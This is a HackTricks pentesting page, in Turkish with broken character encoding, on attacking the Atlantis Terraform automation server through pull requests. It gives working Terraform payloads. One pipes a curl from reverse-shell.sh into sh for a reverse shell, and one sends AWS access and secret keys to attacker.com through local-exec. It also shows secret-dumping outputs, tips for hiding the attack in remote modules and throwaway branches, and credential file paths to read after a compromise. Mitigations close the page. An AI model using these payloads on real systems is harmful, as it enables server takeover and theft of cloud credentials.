# Atlantis GÃ¼venliÄŸi

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin</summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nleri**](https://peass.creator-spring.com)'ni edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keÅŸfedin, Ã¶zel [**NFT'ler**](https://opensea.io/collection/the-peass-family)
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)'Ä± takip edin.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR gÃ¶ndererek** paylaÅŸÄ±n.

</details>

## Temel Bilgiler

Atlantis, temel olarak terraform'Ä± git sunucunuzdaki Pull Request'lerden Ã§alÄ±ÅŸtÄ±rmanÄ±za yardÄ±mcÄ± olur.

![](<../.gitbook/assets/image (51).png>)

## Yerel Laboratuvar

1. [https://github.com/runatlantis/atlantis/releases](https://github.com/runatlantis/atlantis/releases) adresindeki **atlantis sÃ¼rÃ¼mleri sayfasÄ±na** gidin ve size uygun olanÄ± **indirin**.
2. **Github** kullanÄ±cÄ±nÄ±zÄ±n **repo eriÅŸimi** olan bir **kiÅŸisel jeton** oluÅŸturun.
3. `./atlantis testdrive` komutunu Ã§alÄ±ÅŸtÄ±rÄ±n ve **atlantis ile iletiÅŸim kurabileceÄŸiniz bir demo repo** oluÅŸturacaktÄ±r.
4. Web sayfasÄ±na 127.0.0.1:4141 adresinden eriÅŸebilirsiniz.

## Atlantis EriÅŸimi

### Git Sunucusu Kimlik Bilgileri

**Atlantis**, **Github**, **Gitlab**, **Bitbucket** ve **Azure DevOps** gibi birÃ§ok git sunucusunu destekler.\
Ancak, bu platformlardaki depolara eriÅŸmek ve iÅŸlemler gerÃ§ekleÅŸtirmek iÃ§in **biraz ayrÄ±calÄ±klÄ± eriÅŸime** ihtiyaÃ§ duyar (en azÄ±ndan yazma izinleri).\
[**DÃ¶kÃ¼mantasyon**](https://www.runatlantis.io/docs/access-credentials.html#create-an-atlantis-user-optional), Atlantis iÃ§in Ã¶zel olarak bir kullanÄ±cÄ± oluÅŸturmanÄ±zÄ± Ã¶nerir, ancak bazÄ± insanlar kiÅŸisel hesaplarÄ± kullanabilir.

{% hint style="warning" %}
Her durumda, bir saldÄ±rganÄ±n bakÄ±ÅŸ aÃ§Ä±sÄ±ndan, **Atlantis hesabÄ±** Ã§ok **ilginÃ§ bir ÅŸekilde ele geÃ§irilebilir**.
{% endhint %}

### Webhook'lar

Atlantis, **Webhook gizlilikleri**ni (seÃ§imli olarak) kullanarak, Git sunucunuzdan aldÄ±ÄŸÄ± **webhook'larÄ±n** **geÃ§erli** olduÄŸunu doÄŸrular.

Bunu doÄŸrulamanÄ±n bir yolu, yalnÄ±zca Git sunucunuzun IP'lerinden gelen isteklere **izin vermek** olabilir, ancak daha kolay bir yol Webhook GizliliÄŸi kullanmaktÄ±r.

Dikkat edin, Ã¶zel bir github veya bitbucket sunucusu kullanmadÄ±kÃ§a, webhook uÃ§ noktalarÄ±nÄ± Ä°nternet'e aÃ§manÄ±z gerekecektir.

{% hint style="warning" %}
Atlantis, git sunucusunun ona bilgi gÃ¶nderebilmesi iÃ§in **webhook'larÄ± aÃ§Ä±ÄŸa Ã§Ä±karacak**, bu nedenle bir saldÄ±rganÄ±n **onunla mesaj gÃ¶nderebileceÄŸini** bilmek **ilginÃ§ olabilir**.
{% endhint %}

### SaÄŸlayÄ±cÄ± Kimlik Bilgileri <a href="#provider-credentials" id="provider-credentials"></a>

[DÃ¶kÃ¼mantasyondan:](https://www.runatlantis.io/docs/provider-credentials.html)

Atlantis, Terraform'Ä± sadece **`terraform plan` ve `apply`** komutlarÄ±nÄ± **Atlantis'in barÄ±ndÄ±rÄ±ldÄ±ÄŸÄ± sunucuda** Ã§alÄ±ÅŸtÄ±rarak Ã§alÄ±ÅŸtÄ±rÄ±r. Yerel olarak Terraform Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±nÄ±zda olduÄŸu gibi, Atlantis, belirli saÄŸlayÄ±cÄ±nÄ±z iÃ§in kimlik bilgilerine ihtiyaÃ§ duyar.

SaÄŸlayÄ±cÄ±nÄ±za Ã¶zgÃ¼ kimlik bilgilerini Atlantis'e nasÄ±l saÄŸlayacaÄŸÄ±nÄ±za siz karar verirsiniz:

* Atlantis [Helm Chart](https://www.runatlantis.io/docs/deployment.html#kubernetes-helm-chart) ve [AWS Fargate ModÃ¼lÃ¼](https://www.runatlantis.io/docs/deployment.html#aws-fargate) saÄŸlayÄ±cÄ± kimlik bilgileri iÃ§in kendi mekanizmalarÄ±na sahiptir. Belgelerini okuyun.
* Atlantis'i bir bulutta Ã§alÄ±ÅŸtÄ±rÄ±yorsanÄ±z, birÃ§ok bulut, Ã¼zerinde Ã§alÄ±ÅŸan uygulamalara bulut API eriÅŸimi saÄŸlama yollarÄ±na sahiptir, Ã¶rn:
* [AWS EC2 Roller](https://registry.terraform.io/providers/hashicorp/aws/latest/docs) (Arama yapÄ±n "EC2 RolÃ¼")
* [GCE Ã–rneÄŸi Hizmet HesaplarÄ±](https://registry.terraform.io/providers/hashicorp/google/latest/docs/guides/provider\_reference)
* BirÃ§ok kullanÄ±cÄ±, Atlantis'in Ã§alÄ±ÅŸtÄ±ÄŸÄ± yerde olduÄŸu gibi ortam deÄŸiÅŸkenleri ayarlar, Ã¶rn. `AWS_ACCESS_KEY`.
* DiÄŸerleri gerekli yapÄ±landÄ±rma dosyalarÄ±nÄ± oluÅŸturur, Ã¶rn. `~/.aws/credentials`, Atlantis'in Ã§alÄ±ÅŸtÄ±ÄŸÄ± yerde.
* SaÄŸlayÄ±cÄ± kimlik bilgilerini elde etmek iÃ§in [HashiCorp Vault SaÄŸlayÄ±cÄ±sÄ±nÄ±](https://registry.terraform.io/providers/hashicorp/vault/latest/docs) kullanÄ±n.

{% hint style="warning" %}
Atlantis'in **Ã§alÄ±ÅŸtÄ±ÄŸÄ± konteynerde**, Atlantis'in Terraform aracÄ±lÄ±ÄŸÄ±yla yÃ¶nettiÄŸi saÄŸlayÄ±cÄ±lara (AWS, GCP, Github...) ait **ayrÄ±calÄ±klÄ± kimlik bilgileri** bulunmasÄ± muhtemeldir.
{% endhint %}

### Web SayfasÄ±

Atlantis varsayÄ±lan olarak **localhost'ta 4141 numaralÄ± baÄŸlantÄ± noktasÄ±nda bir web sayfasÄ± Ã§alÄ±ÅŸtÄ±rÄ±r**. Bu sayfa, atlantis uygulamasÄ±nÄ± etkinleÅŸtirmenize/devre dÄ±ÅŸÄ± bÄ±rakmanÄ±za, depolarÄ±n plan durumunu kontrol etmenize ve kilidini aÃ§manÄ±za olanak tanÄ±r (ÅŸeyleri deÄŸiÅŸtirmenize izin vermediÄŸi iÃ§in Ã§ok kullanÄ±ÅŸlÄ± deÄŸildir).

Muhtemelen internete aÃ§Ä±k bulamazsÄ±nÄ±z, ancak varsayÄ±lan olarak eriÅŸmek iÃ§in **kimlik bilgisi gerektirmediÄŸi** gibi gÃ¶rÃ¼nÃ¼yor (ve gerekiyorsa `atlantis`:`atlantis` **varsayÄ±lan** olanlardÄ±r).

## Sunucu YapÄ±landÄ±rmasÄ±

`atlantis server` yapÄ±landÄ±rmasÄ±, komut satÄ±rÄ± bayraklarÄ±, ortam deÄŸiÅŸkenleri, bir yapÄ±landÄ±rma dosyasÄ± veya Ã¼Ã§Ã¼nÃ¼n karÄ±ÅŸÄ±mÄ± yoluyla belirtilebilir.

* Atlantis sunucusu tarafÄ±ndan desteklenen [**bayraklarÄ±n listesini burada bulabilirsiniz**](https://www.runatlantis.io/docs/server-configuration.html#server-configuration)
* Bir yapÄ±landÄ±rma seÃ§eneÄŸini nasÄ±l bir ortam deÄŸiÅŸkenine dÃ¶nÃ¼ÅŸtÃ¼receÄŸinizi [**burada bulabilirsiniz**](https://www.runatlantis.io/docs/server-configuration.html#environment-variables)

DeÄŸerler ÅŸu sÄ±rayla seÃ§ilir:

1. Bayraklar
2. Ortam DeÄŸiÅŸkenleri
3. YapÄ±landÄ±rma DosyasÄ±

{% hint style="warning" %}
YapÄ±landÄ±rmada, **jetonlar ve parolalar** gibi ilginÃ§ deÄŸerler bulabilirsiniz.
{% endhint %}

### DepolarÄ±n YapÄ±landÄ±rmasÄ±

BazÄ± yapÄ±landÄ±rmalar, **depolarÄ±n nasÄ±l yÃ¶netileceÄŸini** etkiler. Bununla birlikte, her depo iÃ§in farklÄ± ayarlar gerekebilir, bu nedenle her depoyu belirtmenin yollarÄ± vardÄ±r. Bu, Ã¶ncelik sÄ±rasÄ±dÄ±r:

1. Depo [**`/atlantis.yml`**](https://www.runatlantis.io/docs/repo-level-atlantis-yaml.html#repo-level-atlantis-yaml-config) dosyasÄ±. Bu dosya, atlantis'in depoyu nasÄ±l iÅŸleyeceÄŸini belirtmek iÃ§in kullanÄ±labilir. Ancak, bazÄ± anahtarlar varsayÄ±lan olarak belirtilmedikÃ§e burada belirtilmesi mÃ¼mkÃ¼n olmayabilir.
2. Muhtemelen `allowed_overrides` veya `allow_custom_workflows`
#### PR KorumalarÄ±

Atlantis, **PR'nin** baÅŸka biri tarafÄ±ndan **`onaylanmasÄ±nÄ±`** (bu, dal korumasÄ±nda ayarlanmamÄ±ÅŸ olsa bile) ve/veya **uygulanmadan Ã¶nce birleÅŸtirilebilir olmasÄ±nÄ±** (dal korumalarÄ± geÃ§ildi) belirtmenize olanak tanÄ±r. GÃ¼venlik aÃ§Ä±sÄ±ndan, her iki seÃ§eneÄŸi de ayarlamak Ã¶nerilir.

`allowed_overrides` True olarak ayarlandÄ±ÄŸÄ±nda, bu ayarlar her projede `/atlantis.yml` dosyasÄ±yla **Ã¼zerine yazÄ±labilir**.

#### Komut DosyalarÄ±

Repo yapÄ±landÄ±rmasÄ±, bir **iÅŸ akÄ±ÅŸÄ± yÃ¼rÃ¼tÃ¼ldÃ¼kten sonra** [**Ã¶nce**](https://www.runatlantis.io/docs/pre-workflow-hooks.html#usage) (_Ã¶n iÅŸ akÄ±ÅŸÄ± kancalarÄ±_) ve [**sonra**](https://www.runatlantis.io/docs/post-workflow-hooks.html) (_son iÅŸ akÄ±ÅŸÄ± kancalarÄ±_) Ã§alÄ±ÅŸtÄ±rÄ±lacak komut dosyalarÄ±nÄ± **belirtebilir**.

Repo `/atlantis.yml` dosyasÄ±nda bu komut dosyalarÄ±nÄ± **belirtme** seÃ§eneÄŸi yoktur.

#### Ä°ÅŸ AkÄ±ÅŸÄ±

Repo yapÄ±landÄ±rmasÄ±nda (sunucu tarafÄ± yapÄ±landÄ±rma) [**yeni bir varsayÄ±lan iÅŸ akÄ±ÅŸÄ± belirtebilir**](https://www.runatlantis.io/docs/server-side-repo-config.html#change-the-default-atlantis-workflow) veya [**yeni Ã¶zel iÅŸ akÄ±ÅŸlarÄ± oluÅŸturabilirsiniz**](https://www.runatlantis.io/docs/custom-workflows.html#custom-workflows)**.** AyrÄ±ca, **yeni** oluÅŸturulanlarÄ±n hangi **repo'larÄ±n** eriÅŸebileceÄŸini **belirtebilirsiniz**.\
Daha sonra, her repo'nun **atlantis.yaml** dosyasÄ±nÄ±n hangi iÅŸ akÄ±ÅŸÄ±nÄ± kullanacaÄŸÄ±nÄ± **belirlemesine izin verebilirsiniz**.

{% hint style="danger" %}
[**Sunucu tarafÄ± yapÄ±landÄ±rma**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) bayraÄŸÄ± `allow_custom_workflows` True olarak ayarlandÄ±ÄŸÄ±nda, iÅŸ akÄ±ÅŸlarÄ± her repo'nun **`atlantis.yaml`** dosyasÄ±nda **belirtilebilir**. AyrÄ±ca, **`allowed_overrides`**'Ä±n aynÄ± zamanda kullanÄ±lacak iÅŸ akÄ±ÅŸÄ±nÄ± **geÃ§ersiz kÄ±lama**yÄ± da **belirtmesi gerekebilir**.\
Bu, temel olarak, o repo'ya eriÅŸebilen herhangi bir kullanÄ±cÄ±ya Atlantis sunucusunda **RCE saÄŸlar**.
```yaml
# atlantis.yaml
version: 3
projects:
- dir: .
workflow: custom1
workflows:
custom1:
plan:
steps:
- init
- run: my custom plan command
apply:
steps:
- run: my custom apply command
```
{% endhint %}

#### Conftest Politika KontrolÃ¼

Atlantis, plan Ã§Ä±ktÄ±sÄ±na karÅŸÄ± **sunucu tarafÄ±nda** [**conftest**](https://www.conftest.dev/) **politikalarÄ±nÄ±** Ã§alÄ±ÅŸtÄ±rmayÄ± destekler. Bu adÄ±mÄ± kullanmanÄ±n yaygÄ±n kullanÄ±m durumlarÄ± ÅŸunlarÄ± iÃ§erir:

* Bir modÃ¼l listesinin kullanÄ±mÄ±nÄ± reddetmek
* Bir kaynaÄŸÄ±n oluÅŸturma zamanÄ±nda Ã¶zniteliklerini doÄŸrulamak
* Kazara kaynak silmelerini yakalamak
* GÃ¼venlik risklerini Ã¶nlemek (Ã¶rneÄŸin, gÃ¼venli baÄŸlantÄ± noktalarÄ±nÄ± halka aÃ§mak)

Bunu nasÄ±l yapÄ±landÄ±racaÄŸÄ±nÄ±zÄ± [**belgelerde**](https://www.runatlantis.io/docs/policy-checking.html#how-it-works) kontrol edebilirsiniz.

## Atlantis KomutlarÄ±

Atlantis'i Ã§alÄ±ÅŸtÄ±rmak iÃ§in kullanabileceÄŸiniz seÃ§enekleri [**belgelerde**](https://www.runatlantis.io/docs/using-atlantis.html#using-atlantis) bulabilirsiniz.
```bash
# Get help
atlantis help

# Run terraform plan
atlantis plan [options] -- [terraform plan flags]
##Options:
## -d directory
## -p project
## --verbose
## You can also add extra terraform options

# Run terraform apply
atlantis apply [options] -- [terraform apply flags]
##Options:
## -d directory
## -p project
## -w workspace
## --auto-merge-disabled
## --verbose
## You can also add extra terraform options
```
## SaldÄ±rÄ±lar

{% hint style="warning" %}
EÄŸer saldÄ±rÄ± sÄ±rasÄ±nda ÅŸu **hata** ile karÅŸÄ±laÅŸÄ±rsanÄ±z: `Error: Error acquiring the state lock`

Bunu dÃ¼zeltmek iÃ§in ÅŸunu Ã§alÄ±ÅŸtÄ±rabilirsiniz:
```
atlantis unlock #You might need to run this in a different PR
atlantis plan -- -lock=false
```
{% endhint %}

### Atlantis plan RCE - Yeni PR'de yapÄ±landÄ±rma deÄŸiÅŸikliÄŸi

EÄŸer bir depoya yazma eriÅŸiminiz varsa, Ã¼zerinde yeni bir dal oluÅŸturabilir ve bir PR (Pull Request) oluÅŸturabilirsiniz. EÄŸer `atlantis plan` komutunu **Ã§alÄ±ÅŸtÄ±rabilirseniz** (veya otomatik olarak Ã§alÄ±ÅŸtÄ±rÄ±lÄ±yorsa), **Atlantis sunucusu iÃ§inde RCE gerÃ§ekleÅŸtirebilirsiniz**.

Bunu yapmak iÃ§in [**Atlantis'Ä±n harici bir veri kaynaÄŸÄ± yÃ¼klemesini**](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data\_source) saÄŸlayabilirsiniz. Sadece aÅŸaÄŸÄ±daki gibi bir payload'Ä± `main.tf` dosyasÄ±na yerleÅŸtirin:
```json
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
#### Daha Gizli SaldÄ±rÄ±

Bu saldÄ±rÄ±yÄ± daha gizli bir ÅŸekilde gerÃ§ekleÅŸtirebilirsiniz, aÅŸaÄŸÄ±daki Ã¶nerileri takip ederek:

* Terraform dosyasÄ±na doÄŸrudan ters kabuk eklemek yerine, ters kabuÄŸu iÃ§eren **harici bir kaynaÄŸÄ± yÃ¼kleyebilirsiniz**:
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
Rev shell kodunu [https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules](https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules) adresinde bulabilirsiniz.

* DÄ±ÅŸ kaynakta, **ref** Ã¶zelliÄŸini kullanarak **terraform rev shell kodunu bir repo iÃ§indeki bir dalda** gizleyin, Ã¶rneÄŸin: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`
* Atlantis'i tetiklemek iÃ§in **master'a PR oluÅŸturmak yerine**, **2 dal** (test1 ve test2) oluÅŸturun ve birinden diÄŸerine bir **PR oluÅŸturun**. SaldÄ±rÄ±yÄ± tamamladÄ±ÄŸÄ±nÄ±zda, sadece **PR ve dallarÄ± kaldÄ±rÄ±n**.

### Atlantis plan Secrets Dump

`atlantis plan` (`terraform plan`) komutunu Ã§alÄ±ÅŸtÄ±rarak terraform tarafÄ±ndan kullanÄ±lan gizli bilgileri **dÃ¶kÃ¼mleyebilirsiniz**. Bunun iÃ§in terraform dosyasÄ±na ÅŸunu ekleyin:
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
### Atlantis uygula RCE - Yeni PR'de yapÄ±landÄ±rma deÄŸiÅŸikliÄŸi

Bir depoya yazma eriÅŸiminiz varsa, Ã¼zerinde yeni bir dal oluÅŸturabilir ve bir PR (Pull Request) oluÅŸturabilirsiniz. **`atlantis apply` komutunu Ã§alÄ±ÅŸtÄ±rabiliyorsanÄ±z, Atlantis sunucusu iÃ§inde RCE gerÃ§ekleÅŸtirebilirsiniz**.

Ancak genellikle bazÄ± korumalarÄ± aÅŸmanÄ±z gerekecektir:

* **BirleÅŸtirilebilir (Mergeable)**: EÄŸer Atlantis'te bu koruma ayarlanmÄ±ÅŸsa, **`atlantis apply` komutunu yalnÄ±zca PR birleÅŸtirilebilir (mergeable) olduÄŸunda Ã§alÄ±ÅŸtÄ±rabilirsiniz** (bu, dal korumasÄ±nÄ±n aÅŸÄ±lmÄ±ÅŸ olmasÄ± gerektiÄŸi anlamÄ±na gelir).
* Potansiyel [**dal korumalarÄ±nÄ± aÅŸma**](broken-reference/) yÃ¶ntemlerini kontrol edin.
* **OnaylÄ± (Approved)**: EÄŸer Atlantis'te bu koruma ayarlanmÄ±ÅŸsa, `atlantis apply` komutunu Ã§alÄ±ÅŸtÄ±rmadan Ã¶nce **baÅŸka bir kullanÄ±cÄ±nÄ±n PR'yi onaylamasÄ± gerekmektedir**.
* VarsayÄ±lan olarak, bu korumayÄ± aÅŸmak iÃ§in [**Gitbot token'Ä±nÄ± kÃ¶tÃ¼ye kullanabilirsiniz**](broken-reference/).

KÃ¶tÃ¼ niyetli bir Terraform dosyasÄ±nda **`terraform apply` komutunu Ã§alÄ±ÅŸtÄ±rarak** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)** Ã¶zelliÄŸini kullanabilirsiniz**.\
Sadece aÅŸaÄŸÄ±daki gibi bir payload'Ä±n `main.tf` dosyasÄ±nda yer aldÄ±ÄŸÄ±ndan emin olmanÄ±z yeterlidir:
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
Ã–nceki teknikteki Ã¶nerileri takip ederek bu saldÄ±rÄ±yÄ± daha **gizli bir ÅŸekilde** gerÃ§ekleÅŸtirin.

### Terraform Parametre Enjeksiyonu

`atlantis plan` veya `atlantis apply` komutlarÄ±nÄ± Ã§alÄ±ÅŸtÄ±rÄ±rken terraform altÄ±nda Ã§alÄ±ÅŸtÄ±rÄ±lÄ±rken, atlantis Ã¼zerinden terraform'a komutlar iletebilirsiniz. Bunun iÃ§in aÅŸaÄŸÄ±daki gibi bir yorum satÄ±rÄ± ekleyebilirsiniz:
```bash
atlantis plan -- <terraform commands>
atlantis plan -- -h #Get terraform plan help

atlantis apply -- <terraform commands>
atlantis apply -- -h #Get terraform apply help
```
BazÄ± korumalarÄ± atlamak iÃ§in yararlÄ± olabilecek ortam deÄŸiÅŸkenlerini geÃ§ebilirsiniz. Terraform ortam deÄŸiÅŸkenlerini [https://www.terraform.io/cli/config/environment-variables](https://www.terraform.io/cli/config/environment-variables) adresinde kontrol edin.

### Ã–zel Ä°ÅŸ AkÄ±ÅŸÄ±

`atlantis.yaml` dosyasÄ±nda belirtilen **zararlÄ± Ã¶zel derleme komutlarÄ±nÄ±** Ã§alÄ±ÅŸtÄ±rma. Atlantis, `atlantis.yaml` dosyasÄ±nÄ± Ã§ekme isteÄŸi dalÄ±ndan alÄ±r, **ana** dalÄ±n deÄŸil.\
Bu olasÄ±lÄ±k bir Ã¶nceki bÃ¶lÃ¼mde belirtilmiÅŸtir:

{% hint style="danger" %}
EÄŸer [**sunucu tarafÄ± yapÄ±landÄ±rma**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) bayraÄŸÄ± `allow_custom_workflows` **True** olarak ayarlanmÄ±ÅŸsa, iÅŸ akÄ±ÅŸlarÄ± her repo'nun **`atlantis.yaml`** dosyasÄ±nda **belirtilebilir**. AyrÄ±ca, kullanÄ±lacak olan iÅŸ akÄ±ÅŸÄ±nÄ± **geÃ§ersiz kÄ±lmak** iÃ§in **`allowed_overrides`**'Ä±n da **`workflow`**'u belirtmesi gerekebilir.

Bu, **Atlantis sunucusunda RCE'ye** (Uzaktan Kod Ã‡alÄ±ÅŸtÄ±rma) sahip herhangi bir kullanÄ±cÄ±ya eriÅŸebilen repo verir.
```yaml
# atlantis.yaml
version: 3
projects:
- dir: .
workflow: custom1
workflows:
custom1:
plan:
steps:
- init
- run: my custom plan command
apply:
steps:
- run: my custom apply command
```
{% endhint %}

### Plan/apply korumalarÄ±nÄ± atlatma

EÄŸer [**sunucu tarafÄ± yapÄ±landÄ±rma**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) bayraÄŸÄ± `allowed_overrides` _ayarlanmÄ±ÅŸsa_ ve `apply_requirements` yapÄ±landÄ±rÄ±lmÄ±ÅŸsa, bir depo bu korumalarÄ± atlatmak iÃ§in plan/apply'yi deÄŸiÅŸtirebilir.
```yaml
repos:
- id: /.*/
apply_requirements: []
```
### PR Hijacking

EÄŸer biri geÃ§erli pull requestlerinize **`atlantis plan/apply` yorumlarÄ± gÃ¶nderirse**, istemediÄŸiniz bir zamanda terraform Ã§alÄ±ÅŸtÄ±rÄ±labilir.

AyrÄ±ca, **branch korumasÄ±nda** yeni bir commit itildiÄŸinde her PR'nin **yeniden deÄŸerlendirilmesini istemek** iÃ§in yapÄ±landÄ±rma yapmadÄ±ysanÄ±z, birisi terraform yapÄ±landÄ±rmasÄ±na **zararlÄ± yapÄ±landÄ±rmalar** (Ã¶nceki senaryolarÄ± kontrol edin) yazabilir, `atlantis plan/apply` Ã§alÄ±ÅŸtÄ±rabilir ve RCE elde edebilir.

Bu, Github branch korumalarÄ±ndaki **ayar**dÄ±r:

![](<../.gitbook/assets/image (31).png>)

### Webhook Secret

EÄŸer **webhook secret**'Ä± Ã§almayÄ± baÅŸarÄ±rsanÄ±z veya **hiÃ§bir webhook secret** kullanÄ±lmÄ±yorsa, Atlantis webhook'unu Ã§aÄŸÄ±rabilir ve doÄŸrudan atlantis komutlarÄ±nÄ± Ã§aÄŸÄ±rabilirsiniz.

### Bitbucket

Bitbucket Cloud **webhook secret**'Ä± desteklememektedir. Bu, saldÄ±rganlarÄ±n Bitbucket'ten gelen istekleri taklit etmelerine izin verebilir. Sadece Bitbucket IP'lerine izin verdiÄŸinizden emin olun.

* Bu, bir **saldÄ±rganÄ±n**, Bitbucket'ten geliyormuÅŸ gibi gÃ¶rÃ¼nen **sahte istekler yapabileceÄŸi** anlamÄ±na gelir.
* `--repo-allowlist` belirtiyorsanÄ±z, sadece bu depolarla ilgili sahte istekler yapabilirler, bu yÃ¼zden yapabilecekleri en bÃ¼yÃ¼k zarar kendi depolarÄ±nÄ±zda plan/apply yapmaktÄ±r.
* Bunu Ã¶nlemek iÃ§in, [Bitbucket'in IP adreslerini](https://confluence.atlassian.com/bitbucket/what-are-the-bitbucket-cloud-ip-addresses-i-should-use-to-configure-my-corporate-firewall-343343385.html) (Outbound IPv4 adreslerini gÃ¶rÃ¼n) izin verin.

## Post-Exploitation

EÄŸer sunucuya eriÅŸim saÄŸlamayÄ± baÅŸardÄ±ysanÄ±z veya en azÄ±ndan bir LFI elde ettiyseniz, okumaya Ã§alÄ±ÅŸmanÄ±z gereken bazÄ± ilginÃ§ ÅŸeyler vardÄ±r:

* `/home/atlantis/.git-credentials` VCS eriÅŸim kimlik bilgilerini iÃ§erir
* `/atlantis-data/atlantis.db` Daha fazla bilgi iÃ§eren VCS eriÅŸim kimlik bilgilerini iÃ§erir
* `/atlantis-data/repos/<org_name>`_`/`_`<repo_name>/<pr_num>/<workspace>/<path_to_dir>/.terraform/terraform.tfstate` Terraform durum dosyasÄ±
* Ã–rnek: /atlantis-data/repos/ghOrg\_/\_myRepo/20/default/env/prod/.terraform/terraform.tfstate
* `/proc/1/environ` Ortam deÄŸiÅŸkenleri
* `/proc/[2-20]/cmdline` `atlantis server`'Ä±n komut satÄ±rÄ± (hassas veri iÃ§erebilir)

## Azaltma YÃ¶ntemleri

### Genel Depolarda KullanmayÄ±n <a href="#don-t-use-on-public-repos" id="don-t-use-on-public-repos"></a>

Herkes genel pull requestlere yorum yapabilir, mevcut tÃ¼m gÃ¼venlik Ã¶nlemleri olsa bile, gÃ¼venlik ayarlarÄ±nÄ±n doÄŸru yapÄ±landÄ±rÄ±lmadan genel depolarda Atlantis'i Ã§alÄ±ÅŸtÄ±rmak tehlikelidir.

### `--allow-fork-prs` KullanmayÄ±n <a href="#don-t-use-allow-fork-prs" id="don-t-use-allow-fork-prs"></a>

Ã–nerilmeyen bir genel depoda Ã§alÄ±ÅŸÄ±yorsanÄ±z (`--allow-fork-prs` varsayÄ±lan olarak false olarak ayarlanÄ±r), baÅŸka biri Ã§atalÄ±nÄ±zdan kendi depolarÄ±na bir pull request aÃ§abilir.

### `--repo-allowlist` <a href="#repo-allowlist" id="repo-allowlist"></a>

Atlantis, `--repo-allowlist` bayraÄŸÄ± aracÄ±lÄ±ÄŸÄ±yla web kancalarÄ±nÄ± kabul edeceÄŸi depolarÄ±n bir izin listesini belirtmenizi gerektirir. Ã–rneÄŸin:

* Belirli depolar: `--repo-allowlist=github.com/runatlantis/atlantis,github.com/runatlantis/atlantis-tests`
* TÃ¼m organizasyonunuz: `--repo-allowlist=github.com/runatlantis/*`
* GitHub Enterprise kurulumunuzdaki tÃ¼m depolar: `--repo-allowlist=github.yourcompany.com/*`
* TÃ¼m depolar: `--repo-allowlist=*`. KorumalÄ± bir aÄŸda kullanÄ±ÅŸlÄ±dÄ±r, ancak bir webhook secret belirlemeden tehlikelidir.

Bu bayrak, Atlantis kurulumunuzun kontrolÃ¼nÃ¼z dÄ±ÅŸÄ±ndaki depolarla kullanÄ±lmadÄ±ÄŸÄ±ndan emin olur. Daha fazla ayrÄ±ntÄ± iÃ§in `atlantis server --help`'i kontrol edin.

### Terraform PlanlamasÄ±nÄ± Koruma AltÄ±na AlÄ±n <a href="#protect-terraform-planning" id="protect-terraform-planning"></a>

SaldÄ±rganlarÄ±n zararlÄ± Terraform koduyla pull request gÃ¶ndermesi tehdit modelinizde ise, `terraform apply` onaylarÄ± yeterli deÄŸildir. ZararlÄ± bir kodu `terraform plan`'da [`external` veri kaynaÄŸÄ±](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data\_source) veya zararlÄ± bir saÄŸlayÄ±cÄ± belirterek Ã§alÄ±ÅŸtÄ±rmak mÃ¼mkÃ¼ndÃ¼r. Bu kod, kimlik bilgilerinizi dÄ±ÅŸarÄ± Ã§Ä±karabilir.

Bunu Ã¶nlemek iÃ§in ÅŸunlarÄ± yapabilirsiniz:

1. SaÄŸlayÄ±cÄ±larÄ± Atlantis gÃ¶rÃ¼ntÃ¼sÃ¼ne yerleÅŸtirin veya Ã¼retimde Ã§Ä±kÄ±ÅŸÄ± reddedin.
2. SaÄŸlayÄ±cÄ± kayÄ±t defteri protokolÃ¼nÃ¼ dahili olarak uygulayÄ±n ve genel Ã§Ä±kÄ±ÅŸÄ± reddedin, bÃ¶ylece kimin kayÄ±t defterine yazma eriÅŸimine sahip olduÄŸunu kontrol edersiniz.
3. [Sunucu tarafÄ± repo yapÄ±landÄ±rmanÄ±zÄ±](https://www.runatlantis.io/docs/server-side-repo-config.html) `plan` adÄ±mÄ±, yasaklanmÄ±ÅŸ saÄŸlayÄ±cÄ±larÄ±n veya veri kaynaklarÄ±nÄ±n kullanÄ±mÄ±na veya izin verilmeyen kullanÄ±cÄ±lardan gelen PR'lere karÅŸÄ± doÄŸrulamak iÃ§in deÄŸiÅŸtirin. Bu noktada ek doÄŸrulama da ekleyebilirsiniz, Ã¶rneÄŸin `plan`'a devam etmeden Ã¶nce PR Ã¼zerinde "thumbs-up" gerektirme. Burada Conftest kullanÄ±ÅŸlÄ± olabilir.

### Webhook Secrets <a href="#webhook-secrets" id="webhook-secrets"></a>

